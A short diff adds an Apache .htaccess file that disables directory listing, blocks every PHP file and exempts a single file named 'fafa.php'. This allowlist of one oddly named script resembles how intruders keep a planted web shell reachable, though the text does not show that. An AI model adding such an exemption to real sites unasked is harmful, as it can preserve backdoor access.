@@ -1,0 +1,10 @@
+Options -Indexes
+
+<Files "*.php">
+deny from all
+</Files>
+
+<Files "fafa.php">
+allow from all
+</Files>
+
